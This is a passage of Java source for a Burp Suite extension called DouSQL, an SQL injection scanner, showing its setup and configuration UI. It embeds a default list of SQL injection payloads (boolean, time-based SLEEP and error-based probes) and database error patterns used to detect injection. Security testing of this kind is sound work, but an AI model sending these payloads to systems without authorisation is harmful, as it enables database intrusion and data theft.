package dousql;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.ToolType;
import burp.api.montoya.http.handler.HttpHandler;
import burp.api.montoya.http.handler.HttpRequestToBeSent;
import burp.api.montoya.http.handler.HttpResponseReceived;
import burp.api.montoya.http.handler.RequestToBeSentAction;
import burp.api.montoya.http.handler.ResponseReceivedAction;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.MessageEditorHttpRequestResponse;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.io.*;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.params.ParsedHttpParameter;

public class DouSqlPluginComplete implements BurpExtension, HttpHandler, ContextMenuItemsProvider {

    private MontoyaApi api;
    private JSplitPane splitPane;
    private JTable logTable;
    private JTable payloadTable;
    private AbstractTableModel model;

    // 数据存储
    private final List<LogEntry> log = new ArrayList<>();
    private final List<LogEntry> log2 = new ArrayList<>();
    private final List<LogEntry> log3 = new ArrayList<>();
    private final List<RequestMd5> log4Md5 = new ArrayList<>();

    // 配置目录常量
    private static String CONFIG_DIR = "xia-sql"; // 默认值，会在初始化时更新
    private static String JAR_DIR = ""; // jar包所在目录
    
    // 配置变量
    private int switchs = 1; // 开关 0关 1开
    private int clicksRepeater = 0; // 64是监听 0是关闭
    private int clicksProxy = 0; // 4是监听 0是关闭
    private int count = 0; // 记录条数
    private String dataMd5Id; // 用于判断目前选中的数据包
    private int originalDataLen; // 记录原始数据包的长度
    private int isInt = 1; // 开关 0关 1开; //纯数据是否进行-1，-0
    private String tempData; // 用于保存临时内容
    private int jTextAreaInt = 0; // 自定义payload开关  0关 1开
    private String jTextAreaData1 = ""; // 文本域的内容
    private int diyPayload1 = 1; // 自定义payload空格编码开关  0关 1开
    private int diyPayload2 = 0; // 自定义payload值置空开关  0关 1开
    private int selectRow = 0; // 选中表格的行数
    private int isCookie = -1; // cookie是否要注入，-1关闭 2开启
    private String whiteURL = "";
    private int whiteSwitchs = 0; // 白名单开关

    private JTextArea payloadTextArea;
    private JTextField whiteTextField;
    private JLabel jls4;
    private JLabel jls5;
    private JButton btn1, btn2, btn3;
    private JCheckBox chkbox1, chkbox2, chkbox3, chkbox4, chkbox5, chkbox6, chkbox7, chkbox8;

    // 请求/响应查看器
    private HttpRequestEditor requestViewer;
    private HttpResponseEditor responseViewer;

    // 新增变量
    private JTabbedPane whiteTabbedPane;
    private JCheckBox enableCustomErrorCheckBox;
    private JTextArea errorKeywordsTextArea;
    private List<String> errorKeywordsList = new ArrayList<>();
    private int enableCustomError = 0; // 自定义报错信息开关 0关 1开

    // 白名单/黑名单功能变量
    private List<String> whiteListParams = new ArrayList<>();  // 白名单参数列表
    private List<String> blackListParams = new ArrayList<>();  // 黑名单参数列表
    private int paramListMode = 0;  // 0:无过滤 1:白名单模式 2:黑名单模式

    // 长度差异检测配置变量
    private int lengthDiffThreshold = 100;  // 默认长度差异阈值（字节）
    private JTextField lengthDiffThresholdField;
    private JButton saveLengthDiffThresholdBtn;

    // 响应时间阈值配置变量
    private int responseTimeThreshold = 2000;  // 默认响应时间阈值（毫秒）

    // Payload分组配置变量
    private JComboBox<String> payloadGroupComboBox;
    private JButton newGroupBtn;
    private JButton deleteGroupBtn;
    private JButton renameGroupBtn;
    private JTextField newGroupNameField;
    private String currentGroup = "default";
    private List<String> payloadGroups = new ArrayList<>();
    private JTextField responseTimeThresholdField;
    private JButton saveResponseTimeThresholdBtn;

    // 参数过滤UI组件
    private JRadioButton noFilterRadio;
    private JRadioButton whiteListRadio;
    private JRadioButton blackListRadio;
    private JTextArea paramListTextArea;
    private JButton saveParamListBtn;
    private JButton saveErrorBtn;

    // 黑名单URL过滤功能变量
    private List<String> blackListUrls = new ArrayList<>();  // 黑名单URL列表
    private JTextArea blackListUrlTextArea;
    private JButton saveBlackListUrlBtn;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;

        // 设置扩展名称
        api.extension().setName("DouSQL V3.0.2");

        // 初始化配置目录路径
        initializeConfigDirectory();

        // 创建配置目录
        createConfigDirectory();

        // 输出启动信息
        api.logging().logToOutput("hello DouSQL!");
        api.logging().logToOutput("你好 欢迎使用 DouSQL!");
        api.logging().logToOutput("version:3.0.2 (Montoya API)");
        api.logging().logToOutput("jar包目录: " + JAR_DIR);
        api.logging().logToOutput("配置文件目录: " + CONFIG_DIR);

        // 注册HTTP处理器
        api.http().registerHttpHandler(this);

        // 注册上下文菜单
        api.userInterface().registerContextMenuItemsProvider(this);

        // 创建UI
        SwingUtilities.invokeLater(this::createUI);
    }

    // 初始化配置目录路径
    private void initializeConfigDirectory() {
        try {
            // 获取当前类的位置
            String className = this.getClass().getName().replace('.', '/') + ".class";
            java.net.URL classUrl = this.getClass().getClassLoader().getResource(className);
            
            if (classUrl != null) {
                String classPath = classUrl.toString();
                api.logging().logToOutput("类路径: " + classPath);
                
                if (classPath.startsWith("jar:file:")) {
                    // 从jar包中运行
                    String jarPath = classPath.substring(9); // 移除 "jar:file:"
                    int exclamationIndex = jarPath.indexOf('!');
                    if (exclamationIndex != -1) {
                        jarPath = jarPath.substring(0, exclamationIndex);
                    }
                    
                    // 获取jar包所在目录
                    File jarFile = new File(jarPath);
                    JAR_DIR = jarFile.getParent();
                    if (JAR_DIR == null) {
                        JAR_DIR = System.getProperty("user.dir");
                    }
                } else if (classPath.startsWith("file:")) {
                    // 从文件系统运行（开发环境）
                    JAR_DIR = System.getProperty("user.dir");
                } else {
                    // 其他情况，使用当前工作目录
                    JAR_DIR = System.getProperty("user.dir");
                }
            } else {
                // 无法获取类路径，使用当前工作目录
                JAR_DIR = System.getProperty("user.dir");
            }
            
            // 设置配置目录为jar包同级的xia-sql目录
            CONFIG_DIR = JAR_DIR + File.separator + "xia-sql";
            
        } catch (Exception e) {
            // 出现异常时，使用当前工作目录
            api.logging().logToOutput("初始化配置目录失败，使用默认路径: " + e.getMessage());
            JAR_DIR = System.getProperty("user.dir");
            CONFIG_DIR = JAR_DIR + File.separator + "xia-sql";
        }
    }

    // 创建配置目录
    private void createConfigDirectory() {
        File configDir = new File(CONFIG_DIR);
        if (!configDir.exists()) {
            if (configDir.mkdirs()) {
                api.logging().logToOutput("已创建配置目录: " + CONFIG_DIR);
            } else {
                api.logging().logToOutput("创建配置目录失败: " + CONFIG_DIR);
            }
        }
    }

    // 获取配置文件路径
    private String getConfigFilePath(String filename) {
        return CONFIG_DIR + File.separator + filename;
    }

    private void createUI() {
        // 主分割面板
        splitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        JSplitPane splitPanes = new JSplitPane(JSplitPane.VERTICAL_SPLIT);
        JSplitPane splitPanes2 = new JSplitPane(JSplitPane.VERTICAL_SPLIT);

        // table of log entries
        logTable = new Table(new LeftTableModel());
        JScrollPane scrollPane = new JScrollPane(logTable);

        // 第二个表格
        model = new MyModel();
        payloadTable = new PayloadTable(model);
        JScrollPane payloadScrollPane = new JScrollPane(payloadTable);

        // 主面板 - 优化布局，减少空隙
        JPanel mainPanel = new JPanel(new BorderLayout());
        
        // 创建表格容器面板，使用水平分割
        JSplitPane tablesSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        
        // 左侧URL表格面板
        JPanel leftTablePanel = new JPanel(new BorderLayout());
        leftTablePanel.setBorder(BorderFactory.createTitledBorder("扫描结果"));
        leftTablePanel.add(scrollPane, BorderLayout.CENTER);
        
        // 右侧参数测试表格面板
        JPanel rightTablePanel = new JPanel(new BorderLayout());
        rightTablePanel.setBorder(BorderFactory.createTitledBorder("参数测试详情"));
        rightTablePanel.add(payloadScrollPane, BorderLayout.CENTER);
        
        // 设置表格分割面板
        tablesSplitPane.setLeftComponent(leftTablePanel);
        tablesSplitPane.setRightComponent(rightTablePanel);
        tablesSplitPane.setDividerLocation(0.5); // 对半分割
        tablesSplitPane.setResizeWeight(0.5); // 调整大小时保持对半分割
        
        // 将表格分割面板添加到主面板
        mainPanel.add(tablesSplitPane, BorderLayout.CENTER);

        // 侧边控制面板 - 优化布局，确保跨平台兼容性
        JPanel controlPanel = new JPanel(new BorderLayout());
        controlPanel.setBorder(BorderFactory.createTitledBorder("控制面板"));
        
        // 创建控制选项面板 - 使用GridBagLayout确保跨平台兼容性
        JPanel controlOptionsPanel = new JPanel(new GridBagLayout());
        controlOptionsPanel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.anchor = GridBagConstraints.WEST;
        gbc.fill = GridBagConstraints.HORIZONTAL;
        gbc.weightx = 1.0;
        gbc.insets = new Insets(1, 0, 1, 0); // 上下间距1像素

        JLabel jls = new JLabel("DouSQL-安全鸭专属【超级魔改版本】｜Author By：DarkFi5");

        chkbox1 = new JCheckBox("启动插件", true);
        chkbox2 = new JCheckBox("监控Repeater");
        chkbox3 = new JCheckBox("监控Proxy");
        chkbox4 = new JCheckBox("值是数字则进行-1、-0", true);
        chkbox8 = new JCheckBox("测试Cookie");

        jls5 = new JLabel("如果需要多个域名加白请用,隔开");
        whiteTextField = new JTextField("填写白名单域名");
        whiteTextField.setPreferredSize(new Dimension(200, 25)); // 设置固定尺寸
        btn1 = new JButton("清空列表");
        btn2 = new JButton("加载/重新加载payload");
        btn3 = new JButton("启动白名单");

        // 按顺序添加组件，确保所有组件都能显示
        int row = 0;
        gbc.gridy = row++; controlOptionsPanel.add(jls, gbc);
    
        
        // 添加小间距
        gbc.gridy = row++; gbc.insets = new Insets(3, 0, 1, 0);
        controlOptionsPanel.add(chkbox1, gbc);
        gbc.insets = new Insets(1, 0, 1, 0); // 恢复正常间距
        
        gbc.gridy = row++; controlOptionsPanel.add(chkbox2, gbc);
        gbc.gridy = row++; controlOptionsPanel.add(chkbox3, gbc);
        gbc.gridy = row++; controlOptionsPanel.add(chkbox4, gbc);
        gbc.gridy = row++; controlOptionsPanel.add(chkbox8, gbc);
        
        // 添加小间距
        gbc.gridy = row++; gbc.insets = new Insets(3, 0, 1, 0);
        controlOptionsPanel.add(btn1, gbc);
        gbc.insets = new Insets(1, 0, 1, 0); // 恢复正常间距
        
        gbc.gridy = row++; controlOptionsPanel.add(jls5, gbc);
        gbc.gridy = row++; controlOptionsPanel.add(whiteTextField, gbc);
        gbc.gridy = row++; controlOptionsPanel.add(btn3, gbc);
        gbc.gridy = row++; controlOptionsPanel.add(btn2, gbc);
        
        // 添加弹性空间，确保组件紧凑排列
        gbc.gridy = row++;
        gbc.weighty = 1.0;
        gbc.fill = GridBagConstraints.BOTH;
        controlOptionsPanel.add(Box.createVerticalGlue(), gbc);
        
        // 将控制选项面板添加到控制面板的顶部
        controlPanel.add(controlOptionsPanel, BorderLayout.NORTH);
        // 在白名单位置创建标签页
        whiteTabbedPane = new JTabbedPane();

        // 第一个标签页：自定义SQL语句（原来的payload编辑框）
        JPanel customPayloadPanel = new JPanel(new BorderLayout());
        jls4 = new JLabel("修改payload后记得点击加载（配置文件：" + CONFIG_DIR + "/xia_SQL_diy_payload.ini）");

        chkbox5 = new JCheckBox("自定义payload");
        chkbox6 = new JCheckBox("自定义payload中空格url编码", true);
        chkbox7 = new JCheckBox("自定义payload中参数值置空");
        payloadTextArea = new JTextArea("'''\n\"\"\"\n'+Or+1=1+AND+'Xlz'='Xlz\n'+Or+1=2+AND+'Xlz'='Xlz\n'||1/1||\n'||1/0||\n'%df'%20and%20sleep(3)%23\n'and%20'1'='1\nAND%201=1\nAND+sleep(5)\n%20AND%20(SELECT%208778%20FROM%20(SELECT(SLEEP(5)))nXpZ)\n'||1=if(substr(database(),1,1)='1',exp(999),1)||\n'and(select*from(select+sleep(5))a/**/union/**/select+1)='\nAND%20(SELECT%206242%20FROM%20(SELECT(SLEEP(5)))MgdE)\n')and(select*from(select+sleep(5))a/**/union/**/select+1)--\n1');SELECT+SLEEP(5)#\n(SELECT%207138%20FROM%20(SELECT(SLEEP(5)))tNVE)\n(select*from(select%20if(substr(database(),1,1)='j',exp(709),exp(710)))a)", 18, 16);

        // 读取ini配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_diy_payload.ini")))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            payloadTextArea.setText(strData);
        } catch (IOException e) {
            // 忽略，使用默认值
        }

        payloadTextArea.setForeground(Color.BLACK);
        payloadTextArea.setFont(new Font("楷体", Font.BOLD, 16));
        payloadTextArea.setBackground(Color.LIGHT_GRAY);
        payloadTextArea.setEditable(false);
        JScrollPane textAreaScrollPane = new JScrollPane(payloadTextArea);
        // 分组控制面板 - 使用最紧凑的FlowLayout布局
        JPanel groupPanel = new JPanel(new FlowLayout(FlowLayout.LEFT, 1, 0));
        
        JLabel groupLabel = new JLabel("测试组:");
        payloadGroupComboBox = new JComboBox<>();
        payloadGroupComboBox.setPreferredSize(new Dimension(80, 25));
        
        newGroupNameField = new JTextField("新组名");
        newGroupNameField.setPreferredSize(new Dimension(60, 25));
        
        newGroupBtn = new JButton("新建");
        renameGroupBtn = new JButton("重命名");
        deleteGroupBtn = new JButton("删除");
        
        // 设置按钮大小一致，确保所有按钮都能显示
        Dimension buttonSize = new Dimension(60, 25);
        newGroupBtn.setPreferredSize(buttonSize);
        renameGroupBtn.setPreferredSize(new Dimension(70, 25)); // 重命名稍宽
        deleteGroupBtn.setPreferredSize(buttonSize);
        
        // 按顺序添加所有组件，使用最小间距
        groupPanel.add(groupLabel);
        groupPanel.add(payloadGroupComboBox);
        groupPanel.add(newGroupNameField);
        groupPanel.add(newGroupBtn);
        groupPanel.add(renameGroupBtn);
        groupPanel.add(deleteGroupBtn);

        // 创建顶部控制面板 - 优化间距
        JPanel topControlPanel = new JPanel();
        topControlPanel.setLayout(new BoxLayout(topControlPanel, BoxLayout.Y_AXIS));
        topControlPanel.setBorder(BorderFactory.createEmptyBorder(5, 5, 5, 5));
        
        // 设置组件左对齐
        jls4.setAlignmentX(Component.LEFT_ALIGNMENT);
        groupPanel.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox5.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox6.setAlignmentX(Component.LEFT_ALIGNMENT);
        chkbox7.setAlignmentX(Component.LEFT_ALIGNMENT);
        btn2.setAlignmentX(Component.LEFT_ALIGNMENT);
        
        topControlPanel.add(jls4);
        topControlPanel.add(Box.createVerticalStrut(3));
        topControlPanel.add(groupPanel);
        topControlPanel.add(Box.createVerticalStrut(3));
        topControlPanel.add(chkbox5);
        topControlPanel.add(chkbox6);
        topControlPanel.add(chkbox7);
        topControlPanel.add(Box.createVerticalStrut(3));
        topControlPanel.add(btn2);

        // 使用BorderLayout正确布局
        customPayloadPanel.add(topControlPanel, BorderLayout.NORTH);
        customPayloadPanel.add(textAreaScrollPane, BorderLayout.CENTER);

        // 第二个标签页：参数过滤配置
        JPanel paramFilterPanel = new JPanel(new BorderLayout());
        paramFilterPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        // 模式选择
        JPanel modePanel = new JPanel(new GridLayout(3, 1, 5, 5));
        noFilterRadio = new JRadioButton("无过滤 (测试所有参数)", paramListMode == 0);
        whiteListRadio = new JRadioButton("白名单模式 (只测试配置参数)", paramListMode == 1);
        blackListRadio = new JRadioButton("黑名单模式 (跳过配置参数)", paramListMode == 2);
        ButtonGroup modeGroup = new ButtonGroup();
        modeGroup.add(noFilterRadio);
        modeGroup.add(whiteListRadio);
        modeGroup.add(blackListRadio);
        modePanel.add(noFilterRadio);
        modePanel.add(whiteListRadio);
        modePanel.add(blackListRadio);

        // 参数配置编辑区
        JPanel paramAreaPanel = new JPanel(new BorderLayout());
        JLabel paramListLabel = new JLabel("参数列表 (每行一个参数名)");
        paramListLabel.setBorder(BorderFactory.createEmptyBorder(5, 0, 5, 0));
        paramListTextArea = new JTextArea("username\npassword\nemail\nmobile", 15, 20);
        paramListTextArea.setForeground(Color.BLACK);
        paramListTextArea.setFont(new Font("宋体", Font.PLAIN, 13));
        paramListTextArea.setBackground(Color.WHITE);
        paramListTextArea.setEditable(true);
        JScrollPane paramListScrollPane = new JScrollPane(paramListTextArea);

        // 按钮区
        JPanel buttonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 10));
        saveParamListBtn = new JButton("保存参数配置");
        buttonPanel.add(saveParamListBtn);

        paramAreaPanel.add(paramListLabel, BorderLayout.NORTH);
        paramAreaPanel.add(paramListScrollPane, BorderLayout.CENTER);
        paramAreaPanel.add(buttonPanel, BorderLayout.SOUTH);

        paramFilterPanel.add(modePanel, BorderLayout.NORTH);
        paramFilterPanel.add(paramAreaPanel, BorderLayout.CENTER);

        // 第三个标签页：自定义报错信息
        JPanel customErrorPanel = new JPanel(new BorderLayout());
        enableCustomErrorCheckBox = new JCheckBox("启用自定义报错信息（配置文件：" + CONFIG_DIR + "/xia_SQL_diy_error.ini）", true);
        customErrorPanel.add(enableCustomErrorCheckBox, BorderLayout.NORTH);

        JPanel errorTextPanel = new JPanel(new BorderLayout());
        errorKeywordsTextArea = new JTextArea("ORA-\\d{5}\nSQL syntax.*?MySQL\nUnknown column\nSQL syntax\njava.sql.SQLSyntaxErrorException\nError SQL:\nSyntax error\n附近有语法错误\njava.sql.SQLException\n引号不完整\nSystem.Exception: SQL Execution Error!\ncom.mysql.jdbc\nMySQLSyntaxErrorException\nvalid MySQL result\nyour MySQL server version\nMySqlClient\nMySqlException\nvalid PostgreSQL result\nPG::SyntaxError:\norg.postgresql.jdbc\nPSQLException\nMicrosoft SQL Native Client error\nODBC SQL Server Driver\nSQLServer JDBC Driver\ncom.jnetdirect.jsql\nmacromedia.jdbc.sqlserver\ncom.microsoft.sqlserver.jdbc\nMicrosoft Access\nAccess Database Engine\nODBC Microsoft Access\nOracle error\nDB2 SQL error\nSQLite error\nSybase message\nSybSQLException", 18, 16);

        // 读取自定义报错信息配置文件
        try (BufferedReader in = new BufferedReader(new FileReader(getConfigFilePath("xia_SQL_diy_error.ini")))) {
            String str, strData = "";
            while ((str = in.readLine()) != null) {
                strData += str + "\n";
            }
            errorKeywordsTextArea.setText(strData);
            // 更新列表
            updateErrorKeywordsList();
        } catch (IOException e) {
            // 忽略，使用默认值
        }

        // 默认启用自定义报错信息
        enableCustomError = 1; // 设置为启用状态
        enableCustomErrorCheckBox.setSelected(true);

        errorKeywordsTextArea.setForeground(Color.BLACK);
        errorKeywordsTextArea.setFont(new Font("楷体", Font.BOLD, 16));
        errorKeywordsTextArea.setBackground(Color.WHITE);
        errorKeywordsTextArea.setEditable(true);
        JScrollPane errorScrollPane = new JScrollPane(errorKeywordsTextArea);

        JLabel errorLabel = new JLabel("每行一个报错关键字（用于匹配响应内容）");
        saveErrorBtn = new JButton("保存报错信息配置");
        JPanel errorButtonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
        errorButtonPanel.add(saveErrorBtn);
        
        JPanel errorLabelPanel = new JPanel(new BorderLayout());
        errorLabelPanel.add(errorLabel, BorderLayout.WEST);
        errorLabelPanel.add(errorButtonPanel, BorderLayout.EAST);
        
        errorTextPanel.add(errorLabelPanel, BorderLayout.NORTH);
        errorTextPanel.add(errorScrollPane, BorderLayout.CENTER);
        customErrorPanel.add(errorTextPanel, BorderLayout.CENTER);

        // 第四个标签页：响应时间阈值配置
        JPanel responseTimePanel = new JPanel(new BorderLayout());
        responseTimePanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel timeConfigPanel = new JPanel(new GridLayout(3, 2, 5, 5));
        JLabel timeThresholdLabel = new JLabel("响应时间阈值（毫秒）:");
        responseTimeThresholdField = new JTextField(String.valueOf(responseTimeThreshold));
        saveResponseTimeThresholdBtn = new JButton("保存阈值设置");
        JLabel timeNoteLabel = new JLabel("注意：当自定义payload的响应时间超过此阈值时，会显示'time > N'");
        timeNoteLabel.setForeground(Color.GRAY);
        timeNoteLabel.setFont(new Font("宋体", Font.PLAIN, 12));

        timeConfigPanel.add(timeThresholdLabel);
        timeConfigPanel.add(responseTimeThresholdField);
        timeConfigPanel.add(new JLabel()); // 占位
        timeConfigPanel.add(saveResponseTimeThresholdBtn);
        timeConfigPanel.add(timeNoteLabel);
        timeConfigPanel.add(new JLabel()); // 占位

        responseTimePanel.add(timeConfigPanel, BorderLayout.NORTH);

        whiteTabbedPane.addTab("自定义SQL语句", customPayloadPanel);
        whiteTabbedPane.addTab("参数过滤配置", paramFilterPanel);
        whiteTabbedPane.addTab("自定义报错信息", customErrorPanel);
        whiteTabbedPane.addTab("响应时间阈值", responseTimePanel);

        // 第五个标签页：长度差异检测配置
        JPanel lengthDiffPanel = new JPanel(new BorderLayout());
        lengthDiffPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel diffConfigPanel = new JPanel(new GridLayout(3, 2, 5, 5));
        JLabel diffThresholdLabel = new JLabel("长度差异阈值（字节）:");
        lengthDiffThresholdField = new JTextField(String.valueOf(lengthDiffThreshold));
        saveLengthDiffThresholdBtn = new JButton("保存阈值设置");
        JLabel diffNoteLabel = new JLabel("注意：当payload响应长度与原始长度差异超过此阈值时，会显示'diff: +N'或'diff: -N'");
        diffNoteLabel.setForeground(Color.GRAY);
        diffNoteLabel.setFont(new Font("宋体", Font.PLAIN, 12));

        diffConfigPanel.add(diffThresholdLabel);
        diffConfigPanel.add(lengthDiffThresholdField);
        diffConfigPanel.add(new JLabel()); // 占位
        diffConfigPanel.add(saveLengthDiffThresholdBtn);
        diffConfigPanel.add(diffNoteLabel);
        diffConfigPanel.add(new JLabel()); // 占位

        lengthDiffPanel.add(diffConfigPanel, BorderLayout.NORTH);

        // 第六个标签页：黑名单URL过滤配置
        JPanel blackListUrlPanel = new JPanel(new BorderLayout());
        blackListUrlPanel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

        JPanel urlConfigPanel = new JPanel(new BorderLayout());
        JLabel urlListLabel = new JLabel("黑名单URL路径 (每行一个路径，支持通配符)");
        urlListLabel.setBorder(BorderFactory.createEmptyBorder(5, 0, 5, 0));
        blackListUrlTextArea = new JTextArea("/admin/*\n/static/*\n*.css\n*.js\n*.jpg\n*.png", 15, 20);
        blackListUrlTextArea.setForeground(Color.BLACK);
        blackListUrlTextArea.setFont(new Font("宋体", Font.PLAIN, 13));
        blackListUrlTextArea.setBackground(Color.WHITE);
        blackListUrlTextArea.setEditable(true);
        JScrollPane urlListScrollPane = new JScrollPane(blackListUrlTextArea);

        // 按钮区
        JPanel urlButtonPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 10));
        saveBlackListUrlBtn = new JButton("保存黑名单URL配置");
        urlButtonPanel.add(saveBlackListUrlBtn);

        urlConfigPanel.add(urlListLabel, BorderLayout.NORTH);
        urlConfigPanel.add(urlListScrollPane, BorderLayout.CENTER);
        urlConfigPanel.add(urlButtonPanel, BorderLayout.SOUTH);

        blackListUrlPanel.add(urlConfigPanel, BorderLayout.CENTER);

        whiteTabbedPane.addTab("自定义SQL语句", customPayloadPanel);
        whiteTabbedPane.addTab("参数过滤配置", paramFilterPanel);
        whiteTabbedPane.addTab("自定义报错信息", customErrorPanel);
        whiteTabbedPane.addTab("响应时间阈值", responseTimePanel);
        whiteTabbedPane.addTab("长度差异配置", lengthDiffPanel);
        whiteTabbedPane.addTab("黑名单URL过滤", blackListUrlPanel);

        // 将标签页添加到控制面板的中心区域
        controlPanel.add(whiteTabbedPane, BorderLayout.CENTER);

        

        // 事件监听器
        setupEventListeners();

        // 请求/响应查看器 - 改为左右分割布局
        // Montoya API创建消息编辑器
        requestViewer = api.userInterface().createHttpRequestEditor();
        responseViewer = api.userInterface().createHttpResponseEditor();
        
        // 创建左右分割的请求/响应查看器
        JSplitPane requestResponseSplitPane = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT);
        
        // 创建请求面板
        JPanel requestPanel = new JPanel(new BorderLayout());
        requestPanel.setBorder(BorderFactory.createTitledBorder("Request"));
        requestPanel.add(requestViewer.uiComponent(), BorderLayout.CENTER);
        
        // 创建响应面板
        JPanel responsePanel = new JPanel(new BorderLayout());
        responsePanel.setBorder(BorderFactory.createTitledBorder("Response"));
        responsePanel.add(responseViewer.uiComponent(), BorderLayout.CENTER);
        
        // 添加到分割面板
        requestResponseSplitPane.setLeftComponent(requestPanel);
        requestResponseSplitPane.setRightComponent(responsePanel);
        requestResponseSplitPane.setDividerLocation(0.5); // 对半分割
        requestResponseSplitPane.setResizeWeight(0.5); // 调整大小时保持对半分割

        // 应用主题到组件 - 扩展主题应用
        api.userInterface().applyThemeToComponent(splitPane);
        api.userInterface().applyThemeToComponent(logTable);
        api.userInterface().applyThemeToComponent(scrollPane);
        api.userInterface().applyThemeToComponent(payloadScrollPane);
        api.userInterface().applyThemeToComponent(controlPanel);
        api.userInterface().applyThemeToComponent(mainPanel);
        api.userInterface().applyThemeToComponent(requestResponseSplitPane);
        api.userInterface().applyThemeToComponent(requestPanel);
        api.userInterface().applyThemeToComponent(responsePanel);
        api.userInterface().applyThemeToComponent(tablesSplitPane);
        api.userInterface().applyThemeToComponent(leftTablePanel);
        api.userInterface().applyThemeToComponent(rightTablePanel);
        api.userInterface().applyThemeToComponent(whiteTabbedPane);

        // 优化布局 - 防止控制面板意外变大
        splitPanes2.setLeftComponent(controlPanel); // 上面
        splitPanes2.setRightComponent(whiteTabbedPane); // 下面
        splitPanes2.setDividerLocation(240); // 控制面板高度240像素
        splitPanes2.setResizeWeight(0.0); // 控制面板固定大小

        splitPanes.setLeftComponent(mainPanel); // 上面
        splitPanes.setRightComponent(requestResponseSplitPane); // 下面，使用新的分割面板
        splitPanes.setDividerLocation(350); // 表格区域高度350像素
        splitPanes.setResizeWeight(0.6); // 表格区域占60%

        splitPane.setLeftComponent(splitPanes); // 添加在左面（主要内容区域）
        splitPane.setRightComponent(splitPanes2); // 添加在右面（配置区域）
        splitPane.setDividerLocation(1000); // 主要内容区域宽度1000像素
        splitPane.setResizeWeight(0.8); // 左侧内容区域优先获得空间
        
        // 设置分割面板的最小和最大尺寸，防止意外拖拽
        splitPanes2.setMinimumSize(new Dimension(250, 400)); // 右侧最小宽度250像素
        splitPanes.setMinimumSize(new Dimension(600, 400));  // 左侧最小宽度600像素

        // 注册标签页
        api.userInterface().registerSuiteTab("DouSQL", splitPane);
    }

    private void setupEventListeners() {
        // 监听器逻辑
        chkbox1.addItemListener(e -> {
            if (chkbox1.isSelected()) {
                api.logging().logToOutput("插件DouSQL启动");
                switchs = 1;
            } else {
                api.logging().logToOutput("插件DouSQL关闭");
                switchs = 0;
            }
        });

        chkbox2.addItemListener(e -> {
            if (chkbox2.isSelected()) {
                api.logging().logToOutput("启动 监控Repeater");
                clicksRepeater = 64;
            } else {
                api.logging().logToOutput("关闭 监控Repeater");
                clicksRepeater = 0;
            }
        });

        chkbox3.addItemListener(e -> {
            if (chkbox3.isSelected()) {
                api.logging().logToOutput("启动 监控Proxy");
                clicksProxy = 4;
            } else {
                api.logging().logToOutput("关闭 监控Proxy");
                clicksProxy = 0;
            }
        });

        chkbox4.addItemListener(e -> {
            if (chkbox4.isSelected()) {
                api.logging().logToOutput("启动 值是数字则进行-1、-0");
                isInt = 1;
            } else {
                api.logging().logToOutput("关闭 值是数字则进行-1、-0");
                isInt = 0;
            }
        });

        chkbox5.addItemListener(e -> {
            if (chkbox5.isSelected()) {
                api.logging().logToOutput("启动 自定义payload");
                payloadTextArea.setEditable(true);
                payloadTextArea.setBackground(Color.WHITE);
                jTextAreaInt = 1;

                if (diyPayload1 == 1) {
                    String temp = payloadTextArea.getText();
                    temp = temp.replaceAll(" ", "%20");
                    jTextAreaData1 = temp;
                } else {
                    jTextAreaData1 = payloadTextArea.getText();
                }
            } else {
                api.logging().logToOutput("关闭 自定义payload");
                payloadTextArea.setEditable(false);
                payloadTextArea.setBackground(Color.LIGHT_GRAY);
                jTextAreaInt = 0;
            }
        });

        chkbox6.addItemListener(e -> {
            if (chkbox6.isSelected()) {
                api.logging().logToOutput("启动 空格url编码");
                diyPayload1 = 1;

                String temp = payloadTextArea.getText();
                temp = temp.replaceAll(" ", "%20");
                jTextAreaData1 = temp;
            } else {
                api.logging().logToOutput("关闭 空格url编码");
                diyPayload1 = 0;
                jTextAreaData1 = payloadTextArea.getText();
            }
        });

        chkbox7.addItemListener(e -> {
            if (chkbox7.isSelected()) {
                api.logging().logToOutput("启动 自定义payload参数值置空");
                diyPayload2 = 1;
            } else {
                api.logging().logToOutput("关闭 自定义payload参数值置空");
                diyPayload2 = 0;
            }
        });

        chkbox8.addItemListener(e -> {
            if (chkbox8.isSelected()) {
                api.logging().logToOutput("启动 测试Cookie");
            } else {
                api.logging().logToOutput("关闭 测试Cookie");
            }
        });

        // 参数过滤模式选择事件监听器
        noFilterRadio.addActionListener(e -> {
            if (noFilterRadio.isSelected()) {
                paramListMode = 0;
                api.logging().logToOutput("参数过滤模式: 无过滤");
            }
        });

        whiteListRadio.addActionListener(e -> {
            if (whiteListRadio.isSelected()) {
                paramListMode = 1;
                api.logging().logToOutput("参数过滤模式: 白名单模式");
            }
        });

        blackListRadio.addActionListener(e -> {
            if (blackListRadio.isSelected()) {
                paramListMode = 2;
